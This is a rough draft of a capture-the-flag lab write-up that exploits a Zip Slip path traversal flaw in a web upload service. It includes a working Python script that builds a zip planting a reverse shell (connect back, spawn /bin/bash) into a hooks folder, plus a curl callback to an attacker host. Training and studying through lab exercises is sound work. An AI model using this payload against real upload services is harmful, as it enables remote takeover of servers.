# Title: The Hollow Shell

#### Category: Web

#### Difficulty: Medium

#### Description: 

You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear. 

---

## Task 1: Hacker Holidays: Day 10

<img width="939" height="881" alt="image" src="https://github.com/user-attachments/assets/d87e444a-54bd-4c18-8072-047af299e6b3" />

<img width="945" height="460" alt="image" src="https://github.com/user-attachments/assets/6dd03748-8b7d-4e94-a65e-e770e761b239" />

#### Analysis: 

This is just basically a reverse shell 

---

### Methodology

At the end create a summary attack flow on what did we do in bullets (do this to other also) 




Zip Slip is a form of directory traversal vulnerability 


do an nmap scan 
Command:
```nmap -Pn -sC -sV 10.130.190.24```




This gives you open port 
Expected output: 
```
  22/tcp    SSH
  5000/tcp  HTTP 
```



Access the website 
Victim_Ip:5000
Inspect > Check net
work tab 
This gives you a user and pass 
If we also check there's an existing folder named static
> Log in
Expected output: 
```
http://10.130.190.24:5000

  user: concierge
  pass: StayNoticed2024!
```



Analyze the website 
Analysis:

Testing for uploading the file---------------------------------
Create a test shell to see the assets 
Allowed asset types: 
Expected output: 
```
{
    "name": "test",
    "assets": []
  }
```
Command:
```printf '%s\n' '{"name":"test","assets":[]}' > shell.json```
Command:
```cat shell.json```


Zip
```zip baseline.zip shell.json```
Try to unzip it 
```unzip -l baseline.zip```

Upload the baseline.zip to the website 
It'll be stored in a directory 
```http://10.130.190.24:5000/shells/<string>/shell.json```
We now know that there is existing directory named "shell" other than "static"

test--------------------------------------- 






Delete this--------------------------------------------------------------------------------

Create a .json file 
``` vim shell.json ```

```
  {
    "name": "callback-test",
    "assets": [],
    "hooks": [
      "curl http://ATTACKER-IP:8000/"
    ]
  }
```

Zip the .json file 
``` zip test.zip shell.json ```

Upload it in the website 
It'll be stored in a directory 
```http://10.130.190.24:5000/shells/<string>/shell.json```


There could also be a folder named "hooks" 

Delete this--------------------------------------------------------------------------------







== Test for Zip Slip
Zip Slip occurs when an application extracts paths such as:
```  ../../static/proof.css```
without checking whether the final path escapes the intended extraction directory.


Create a .py file 
``` nano concept.py```

```
import json
import zipfile

manifest = {
    "name": "zipslip-proof",
    "assets": []
}

with zipfile.ZipFile("zipslip-proof.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr(
        "../../static/zipslip-proof.css",
        "ZIP_SLIP_CONFIRMED\n"
    )

print("Created zipslip-proof.zip")
```
What is this code all about? 
> Creating two files inside a zip file?

``` python3 concept.py ```
``` unzip -l zipslip-proof.zip ```

Upload it in the website 
It'll be stored in a directory 


Navigate
```http://10.130.190.24:5000/shells/zipslip-proof.css```


-------------------------------------------------

We will now try to access the hooks folder 

build_shell.py

Break this down (to further explain)
```
import json
import zipfile

LHOST = "10.130.97.35"
LPORT = 4444

manifest = {
    "name": "shoreline-update",
    "assets": []
}

callback = f'''
import os
import pty
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(({LHOST!r}, {LPORT}))

for descriptor in (0, 1, 2):
    os.dup2(sock.fileno(), descriptor)

pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr("../../hooks/callback.py", callback)

print("Created reverse-shell.zip")
```

```python3 build_shell.py```

```unzip -l reverse-shell.zip```

we now know the position of the hook folder 


(Let's try to use other rather than penelope) 
Penelope shell handler (this just create a shell?) 
``` wget --- penelope.py```
This setups the listener or for the shell 



Upload the reverse-shell.zip to the website 



go back to penelope 

> sessions 1
> id
> ls -la
> ls -la /home
> > ls -la /home/roomservice 

We nbow have the falg. 























---

### Today's Itinerary

1. Find the flag
>
> 

---

### Flag
> THM{}
